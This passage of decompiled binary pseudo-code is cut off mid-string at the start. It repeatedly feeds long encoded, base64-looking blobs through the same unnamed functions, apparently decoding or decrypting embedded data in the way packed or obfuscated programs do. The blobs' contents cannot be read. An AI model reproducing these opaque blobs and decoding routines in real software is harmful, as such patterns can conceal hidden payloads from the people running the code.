bJOx2An4ye5VPxRK3mfi3boEIs2NvZQzP4cgvPXOnBKGpP99dwgPhTGoasyybqymqmVYhlmT8SX/OxTUyxzRZ5QUcO769NPYU16EYM84gQ3ccsUOwvAkdCDcIawaXSJYw7kWaCR2zDQ5TsWa1RvK2dcEDmsRMAdWlUCKj58eRxH2FTulE54tRdSszGuOucOKtGFCqB/h5QKiOfioqbCJtaYOHIrgMK0JviOjr/Bqtz4OAyWMPhK1VlD0AZfOI4pOhMGOk/hMxNRgWO9UthCjY8T84foxthdnArvIrgx4pA1X8X8NbU1avbCngs6TyVNtRMFSAmyBxYLXAmcOgIPnFUsFZu7tyP8vdJe/2JUZ+beVmxmpnkb7yUvxdOcCZaC95ai9ZUsHyEaDR42RmtoHFv2aWhuF3Lx49aKVOBKaI3+BJXfeo9J0Yi7uHqEc6WW1AxYHFLFFPKOwTWJ8f64Q3FLuvbKBbqjPD9BZUwuEHNZE0CIzx5QIFYqXEtGATMulZZ3LQlotLRWWT7BLKExurDS9MEjrvPL++8aPx5agvjGREEPa94zabrwf/Ly/cMgi0BQ2Yff2KVnwDBvQDWGL2Z+3uKcSKpj2a7zToHlbYq3BO+AHWN3YKcoG6ZMx1Yb1il6iCmBfzEbNiNkod3BEAOIGDssqbF2stsSw83uhvMdlfU7krViu2f2blO041kfG8diQltSt/3PZ2hdPXf/7gqDSaMRgvn0ZFSRqaA33xEcpWR930+8\"\n    ;\n    puStack692 = &stack0xfffffd88;\n    uStack696 = 0x401c1e;\n    puStack692 = fcn.004028d0();\n    uStack576 = CONCAT31(uStack576._1_3_, 0x24);\n    pcStack684 = *0x4295b4;\n    uStack688 = NULL;\n    uStack696 = 0x401c38;\n    fcn.004022b0();\n    uStack696 = 1;\n    pcStack588 = pcStack588 & 0xffffff00;\n    pcStack700 = 0x401c47;\n    fcn.004024b0();\n    uStack704 = &stack0xfffffd68;\n    pcStack700 = \n    \"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\"\n    ;\n    puStack708 = &stack0xfffffd78;\n    uStack712 = 0x401c5b;\n    puStack708 = fcn.004028d0();\n    uStack592 = CONCAT31(uStack592._1_3_, 0x25);\n    pcStack700 = *0x4295b4;\n    uStack704 = NULL;\n    uStack712 = 0x401c75;\n    fcn.004022b0();\n    uStack712 = 1;\n    pcStack604 = pcStack604 & 0xffffff00;\n    pcStack716 = 0x401c84;\n    fcn.004024b0();\n    uStack720 = &stack0xfffffd58;\n    pcStack716 = \n    \"UkWsiBQ8ARNnQGXDfA+SQiibtSqsQLeHMBnZqT2w91JypUVflqiNnfO1YcTJFwcJQdr9eaq/czbEdKtnWjg5HBib2awfOZ084SjjYbyWbd08EVzmlVPSV6SrrcuPeogB8co+M+/kz8/xV5CjM1gPPnchSYXE67x9auedUjQ2y/M0J1IhqEUCXejH48bEBH//TEbirVVHal/vgkhgAWyTMomliog1PlAB0BxvGM9FE7nQqRHuuQtXIPtoDA5jfz581yiZReItaCn3qYPBLidDiee6K32WqJECFhXE1r+WKCC4mBOtI3/X33P3GLsETWSw6saMN5rmcNBd0QzvYf4HkPpma1OBXGlUiIFPMUSDUi29UAMgcC4KQmBDnRAQMw5p1VPl4ttu0mxIicQxhp8alfWmKgRrgN8x552aTzy93uT9n9POmQmnCmRxXsKz0x2H8j60idTDBbvv0JaZpZVZHpn2P6iFYN5VCuIobR4Nu8ntzkPte6RP6cukb0COppLYCefBVdF7j/JfTacTJ+NLF4RAGY6xlYzf+rA7x6nti3wHS+rJREtKU2L7zWyWAKJVcP06mt6fNWedY/jQ8ave82WVty0VsvA/h+FHfXIgQGXwFA2aMxZSpiCQ6wmdDQ3lQKObbCkePqTmq5SxuGPfsbg26/zrehrWbw5tD1Eh6LdIKHo4U5O0kCTAsWbF2HKLtujxG5JYL4MkmrY7RqcR2A76LOT4+tcs1wCiey5sB9hxZosMjxwsJ4GBhVWMuimGOtC5zYLdXJbBNt4jQOBgadFEDwmwRGKGumDdJ2R5wDDmEawMWc7UoXYgWRyS1Mnp2lY1YkDIT4bF+wGU6UixHWlhhSRDKpeWyUMOLMIjyYlzHnstAJ/RpRBgAb+U7FvqYiIFxcS4ienNm+xBgIKigLRdveXXEKyowVXfWmv1MWSSnmYXR8obqKPUHZcWzyZ4VWvjhuwHd1qaNMkrVPYn3wF6rAbzNuqWQnhCx/H3jXDYlrE+eb3a1DcYDfsAxywn+JPv2bnfwZMfqDH0PPzZyHBNSnvaIRCPhauqriSFdx18xBsQGw/DrcvG/3Gew2zWukpvE/5q6bp95CXRYsMlJE1wGvmoJIUJBBITUVnUAxxsNYFDhwFcBgYg4N8VY5KDxzJyEzAdZ4ik9CUVs12CEc2Scy9kDxE/J6G+7UI/km4Q1xtJ5Vh61H6hCjxdN5slcF2SOhD3Ia4gwJ/DSCsN/FcNSZihpUSHSgEXttdMfDLAJVPJaOs46Kq72tu1NonT6mpusw5I+T21tGbLYPqZ24WLN2CfZcEfC8FBjvJxtLmPIiJt9w61d5Rp4W6R9j8l3y4hxeCwZvh4hgsKuRdJ9XRnj77ZG6SPDOyqxDmzCIn2GDXF6TDNfb6Lu5DVu3WG54P7fYKPoLszpHGWZ1NakC73ab4ArAWnftqHEUCHLJams6kYIpcZGfI/3huCQ77sWfI87hc8njpWrCpOHoud29Mx6xIfsucLC0wtfgs2ZHoiwCOp4qVShpF1zFFv37TVOg7vagFBn8zYZScq7RexKqwvCPD3nlpx4DMAz7j4NRgOMBlj9JqtMC7dN8sDFAe9QOCZO+WDXtwMD79z93cgb25TSp2rjXdvSsPxe40cRyoOefLl3AsIiqAK6kugjZDIetlEIuI4t1qzQnzYZBCNdzs7+ArZtr8dCGcOK5C44zD4HhY2GPIsUqqIBuXGOpovUjBWEA4CYu9h0AZaOD444TrY+lK8VE2c5BOoOupVHWB5uCC4xkedBTg4NMgwoDadT/Rc41YuCEfX4LxrNKw2dApeECA4zBjXs29NIFRIOczyXFEPxhM7O8YznT3yFDuAfKLjRMU2DBT0lMbqCHQIUXwiLkkFZmcH1rcikJrUOr0UnUyFfDgobnq8cebm4I443vi6Vk4htgPh5bQ7XGesCDqK68BRDTsOWgM52tYavb4IIFRuKAOyLws3NMwNZdg+UyTzrGkgGIpWRy+A\"\n    ;\n    puStack724 = &stack0xfffffd68;\n    uStack728 = 0x401c98;\n    puStack724 = fcn.004028d0();\n    uStack608 = CONCAT31(uStack608._1_3_, 0x26);\n    pcStack716 = *0x4295b4;\n    uStack720 = NULL;\n    uStack728 = 0x401cb2;\n    fcn.004022b0();\n    uStack728 = 1;\n    pcStack620 = pcStack620 & 0xffffff00;\n    pcStack732 = 0x401cc1;\n    fcn.004024b0();\n    puStack736 = &stack0xfffffd48;\n    pcStack732 = \n    \"oG8oOJB8eip0Xig4DQwD9I5AyNz5vgN28mBDlHLlFfxhSLJ1Uqk7Q2tU4wF8HmZUsr8OeDxuil5JeLKqoEoNgoIqDgaUOMyq7Dh8MPx/kECRzGZmeUO2HR6dneEbDlJTUic22lYOVDHaeko8CPBkGUJvZ+KlYDDUGLBO8kdHbQrzbDhHDBgCAqrGWmI6R3wIVoQdRHyZUiIi/HRuOuY71CA6NGszu5yGIPL8dEOgnX92B28QPqZaYLg5OWmb+fN6bkWZqYD4HV2o1ghYL5Z0mcAq4tUpRn9i/FFNiv/drAo4CWa3ZiLMUlMqKP+pOEo8bmEFVmRDD/MKblpQzAW4PUpx+pFDmXmhPGBeTTjYQ/nU1DA7SBBDH+ORPgZmZSx6U11gktcqYmRJkHxNZU38Ph5IKuYovlN5A7D4am+w/qd7HRoNfbgo9jjFJzg6IhPrOqwadDY2MNVs4Cp8inrUhnxpHS8urk9Kinucd79JFMPUWt60XTyqSA9hlK98N2WaUmR2M5BJd/YedOrDcW6GanfqYKZ+CmJGApB2wbj4qGMqYQvuN47k3Wc6oNa7slS0fB0OF/hRZRRb3gwrtjgnmk+2EMrMItrA8ztrsFJaXtpN2DovlJSaHTcGPGkMUiomJMzYAaANYe1JKiBHchCwK9QGOCew1yxuNz5SJkvXsgAqijTDLGwn4Unz2P6dqbvDrMyirk8Z7N+Q4kyci7jznBUGIMEZvb59YXlngzdUODlCcvQROrRy0UH01rN2KEC6Sgge+XpRfMnfYFqDhTh3PMxmd/O4Zep6kJDzTLMZLlosLbVlyQcCzClbcL4hDnkh1tS3d8xDfx03LAoQrL5JIBY1R3O0IUBUOdvucUx5vRRdjFUCS0JtRQntq1Hi4hieCUBg4iYREUMBpM9Rm1/MLYpJepreXy3hECxQc+HDeKh4Pj72WHwfTAbIFjhB+UhIRyew//CccXuj8N5nNS/dJ7H4YfOvZScmkU8fJsAlTHflJvGbNAN0DR+JyWIXafCwJW9T8ism4Rc5DTWMgqHi3LBLbNFrPm0oTFuYAz6Tk2aanhwcXAJP3kq5wppbM3n2Kc1JK6h8cQhvWjDaaBojFr7/eiuuJx86O3CWO7IwrNohfSOcwRhwJiWpAKv5rifP52PInX0iTvdWTjUbhw7+epi+DDnkLPPPArtkuOSOIe0dadlYOfoGBHxrLgLqJDpgjJJfwAaANR7YnrZi8mNy4ecPWG8CONk5UtkGOFZdOncuhNKD5JTkArx4aNdmRkefERslJcO3EoJMGwmlBbiEAzFG9PYbATXZljg/OTvDm45WN/cJN3lLRPXYi7BUMzNHfyWlOI4MdW4apVWEtRY8Tg6wlEqU1hY6dVtcs+hc6EQVW7rVyDAw91tmIsxKGKKoxkpvOeSBLmITBHEW3Bh2IEXuxWRa9spKOq9GxXQ8RkemVQMwgFVC8zLcGvww97IRFixstQoypCC4HBNqZSyzui6z7cSUceM0RkQ6N2oa1uhgHEwGYhiUlLDHsicDC5vPD/sIQXWE9v3Ff0ohQx0HoTHPWIoXKcd3xHTHjA9xs0WBdunZLvbF301zlVHdSEth7DEBgUhDEtMwRe+ngW0DrhJnS5oPeNcX83M6ISop4e93JpWMqeEUXcYdGWi/0btIaB/ExliLcEdI4XejL3EBEMbtd0jrO4wtKl0+YNZn5SkjahGRZwVb2Z3GTXF6lAtPZNUCCeNDrTRb6fu9WHFCslcOzS4hzHtqAxsra60fN1U9CX3NHG8zUK9KUxLWCGBGvsWhF3nHLEWBJWdIrSrN9jTznlAQENdMIwD9fxt8zWmcIQ8bySIrg0YWzXFqwXPSelR0eBgsehJdKrOIPnpaHQjoJpUO+V2QQeeN111pUW9uwJjAlCBBQ2Dpo3CvpFNSXS798d9KCXk58Q26j/GKwt8GKxqE05GPwoxY5b5O6yfX51WsVUXj2WY1jaAhrzRHUQVXGJtDCy2xApHu\"\n    ;\n    puStack740 = &stack0xfffffd58;\n    uStack744 = 0x401cd5;\n    puStack740 = fcn.004028d0();\n    uStack624 = CONCAT31(uStack624._1_3_, 0x27);\n    pcStack732 = *0x4295b4;\n    puStack736 = NULL;\n    uStack744 = 0x401cef;\n    fcn.004022b0();\n    uStack744 = 1;\n    pcStack636 = pcStack636 & 0xffffff00;\n    pcStack748 = 0x401cfe;\n    fcn.004024b0();\n    puStack752 = &stack0xfffffd38;\n    pcStack748 = \n    \"c4wapmQWS/8l/vkec2pJQuJK7UyL/gdXnE9gTlV0W7tgx4trEaXjCVdON402z0EvOZhFzVcts0NlKr50dy2tHhF7163PG814gIx3K8dtmyDtYDZ9VUoja/iubieRI2M0d+JInDlCdW4EQirCG1ZRCg3weSPy1puCmKV9lB1Mc3EvYgSoZUBtLGdlCzB2fL+zJHdgAJgHdTVLSXk4tThOLlOjnCtXBbrjSS/l4Vef2SNV8STPDYHVLTvp1TA7YS9tPX0ySqvBWRblFi3ijwdVS6+WnDp7oxETWzdJIFktbkhLJh+efTxg9q0H4GeV55skZiVbTwv5OxBIXFNQTjzHDG6XF2dEElW0S6LzpHhzfUg0FneIe1wJ6NlEF8ZJOpryOAhtL5WLq+DjWpg8ErlW2XoRUQo4HxM1AgFnM7sALQdqcdNeGxJEDCXTXnISa44lVlRLUsHDWUxOTSZmmThSXWJKZ9JB4RkGV6UlXymvcPj4LnEJn/u9Dw01NidsOYEA9jCOJSIDxw+y6SqIfSBlVXDSut32MRmpQWeFj/bzBjc3UOhlJD6GUBJqclQmZf+C7FBpE42mWikQAVT1NgHsTtK40PYVauYAfIyCBzZFDHFzFf+mvdAbTqz6Nk5ph2cVZV5JcoJ70VTwKOhxDjjFxjc2TPLQRpJaFBA99NjlthCMxiEafJwbB1Qn3p9MYYxSXLBQnSYM3mIFtWIMXjBqOwk7DyYvj9lBf1XRajdhDWHBP3UPQgFkRyilCONbBWF7K6u/nB3TCDx9ZfNjFVcBZrh7dJ1WCQl9NE6YsQ8ZRGcOn2dx5xQnPNBPMWhRtz+wsaUnr1V/IG+pLVtdInkR5QFhaHkSPZyl4P14Zk64alVOwdNIqxNBYJ7tBMuxby1ER65AiYnJ2OA6vyIiMwnB/40aZ2WXJQ5qXZZ9PSJV/xrrZkDh6321FHUSZztTBpIXV5/YurhTeUIlF7rhz3KlEpKDYvvoaqUVcqtmg0PLjRLgksU0UQ9VZj+XBBcn7SdhXW5jl1QZu6kne89MFbiBWaVoFA9TW9AZF0cUv0JBNjzXSNAvdNdMV0y4iFybgi7eZEOdlqys3vLYwkR6aKzMEPoqDcyN1fC5wDAq5D4e0DhSMPTWva973ceR7WsaGbRra4vfFJEfd1pZzVk2Y0QILRB/wpER6jTcdVINMK4Aes832h83OohKMVo0tBAXRKRspUkdNzM9sXSriQwqbpGHUBavBflrkG9KPbOnay+Dv8/LFmbqLV8jwbBbd79CpwSjkefDQ+hGAVN+SAtrf2WwNoRLG2CEXnJTDeRY81MTP4IO2nh7QXOwEQ1YEbC6lm5fXzjz1Q8/z/GpDAVST5MtTObhURNkUpKmJLewUWWBN5hEXsi4jheUI7wavvif/gf2cOYkplZw+J9ks3ARyiNgfYI0ZJ4X9xL0KmKmmbQoYAgIKPJCUkt3cOLivKJ26LZ/RQ2B73cCMv0bG5CeMqxpCQkl3Sdz0yeY4dN/9WH/SMsxu8enRiXb6wlqM1eU2wr9CzkASa2jPbq+A5q/v8sDZ029U1NTFynrCz4ui1c/2x4GY9I7EAYvAyA1IhVTcwT9A1gP8TXhakZJVSoy29yfY2oxO5RJJQlwBCqLMx9gldlJEM056iCqVdhU1uVk12Jzah55WyXdIEeFBVp1VmdZBsMit6U/Bz1r/6NmhnMwkHJD3mcHa3DCu/0WeWbDEgKb0yK6r3t2WQbRKXpwV8fhCmx/2rlXvYpBrWgN851UWtphdJAsAkhvVRbw1rxGbw23eq6sTuqsO7+pLKOh+GFMG6kGa07WU7OnvjTeVBPiwmREBnphAggqH6kdEMMVxUBuA3Erp2H6KkICDsaHZXKjdgNgCg9vdLJvB5ARNTcShTKuZxUpSGhLz4Jye0VvKyyM2ixD6yus5IxV6XpMQIizRwoIclK2OAjaJxjZLHvFZg9GLddMJjoQZeVIGG8WA4RC1uc2Nqw4XHJyRzYh\"\n    ;\n    pcStack756 = &stack0xfffffd48;\n    uStack760 = 0x401d12;\n    pcStack756 = fcn.004028d0();\n    uStack640 = CONCAT31(uStack640._1_3_, 0x28);\n    pcStack748 = *0x4295b4;\n    puStack752 = NULL;\n    uStack760 = 0x401d2c;\n    fcn.004022b0();\n    uStack760 = 1;\n    pcStack652 = pcStack652 & 0xffffff00;\n    pcStack764 = 0x401d3b;\n    fcn.004024b0();\n    puStack768 = &stack0xfffffd28;\n    pcStack764 = \n    \"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\"\n    ;\n    puStack772 = &stack0xfffffd38;\n    uStack776 = 0x401d4f;\n    puStack772 = fcn.004028d0();\n    uStack656 = CONCAT31(uStack656._1_3_, 0x29);\n    pcStack764 = *0x4295b4;\n    puStack768 = NULL;\n    uStack776 = 0x401d69;\n    fcn.004022b0();\n    uStack776 = 1;\n    pcStack668 = pcStack668 & 0xffffff00;\n    pcStack780 = 0x401d78;\n    fcn.004024b0();\n    puStack784 = &stack0xfffffd18;\n    pcStack780 = \n    \"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\"\n    ;\n    puStack788 = &stack0xfffffd28;\n    uStack792 = 0x401d8c;\n    puStack788 = fcn.004028d0();\n    uStack672 = CONCAT31(uStack672._1_3_, 0x2a);\n    pcStack780 = *0x4295b4;\n    puStack784 = NULL;\n    uStack792 = 0x401da6;\n    fcn.004022b0();\n    uStack792 = 1;\n    pcStack684 = pcStack684 & 0xffffff00;\n    pcStack796 = 0x401db5;\n    fcn.004024b0();\n    puStack800 = &stack0xfffffd08;\n    pcStack796 = \n    \"0/v68Am/lTwe1NB/aKL6buGg2FSZjQGbgMxDaWLu0zr8uTsecYJBTdciY/9fXu0OwQU/QvMqNCV8tOGLigKqzDSvbGgcLJYpfg8I3NNCJ37IedtnfXPYUadl2iEalqHFM1fJR38wLrVdEsQT3ll+OigQPjS0SWRaODbG+dwWZSv4tulISja+jmRC//0J23BWDhaL+4DYQ0qqMAghnuwO6QmWGiXOkCwRRKK4OIC09Anps4M3svQNRfmiqi3Fipcgy5yRA/PzSPqaUV6+6JYc9IfFMPLlIG5DMnYvPKqdXt3ypf1pvTAfst2URvpjj/Vo6+YQZ3mqecw7Zl0wh//PPq8QUeinwldaaa11LaKtMnuS5jfvnrIaUdiTxBi5xUqs7sePrN7RcEfPlAYYLfYlKu0fjym5/VbXlAITwi2GbdI/2XFTam0su+SKzHXqvkDx5vAHCs6elTuh2fws176xpHukGLnQB62reOnSNZ+pw9/Gz/hkUt8iOcu2O/LGtHBSnUtyHaoHAblYvtY+RTOG7+qrfcsEyfIAwOAJIfTgyU3zAnX7+nVOIT1aOVeg7ydqxCNB+N2Cp+LDtq5uy8C2JIKw/S/whB5MUsh7aIiaiNqpJHBYjugnSRncRw6ptbGFEatuxR9ytl+ZXrOZLn29h/+cyRVqwq587Jv/AjD3OGloo+CKUweBWqxGP+XMcXfqR0uFaQLHbSGfD4S1PXGYp/WDAhbJugnwx3RKiqWHIrSdlrGet0LFWFDC4jHCnwbDUnK4X2RC+AJs9wNuwYpmf+XQS36XIQJEOKM9aBf7wzx1VCaH2YWSn2SS37+PPRZ7Zs4bl+hJuEsuK3OYXdjacELEGUuwpty8v/URGAJ2rvitnuBtjovSoQk4geLwFGEWK6dQaDa386LycC5Lrs9dZKOQfScs+vqIeA5xd/xZiHU7OzRrz8NCXC5oskNHFHhf9OQFJj3YVnZZ/EYW5pIoz/3v9lS/Tk3NrlFpZWyRdTNUaAULz5nx7QmYAnbcrX9KiQLDjyxblZtfRRDVPQGVXumeiEBVMVe92W/TpgS++/mBjPNmCnhRYIwogC1X+TUtH/Nh2ZNzmfo/McIP7ArZsrQYjsDrC2RnhlP2Aduaac2+LzobaiJt0LgooGqb61ym42FMHUnXqrdhQNB7KnTnMCAldlGQKmPrKyC05+YOS2D2FviyCi/rfhY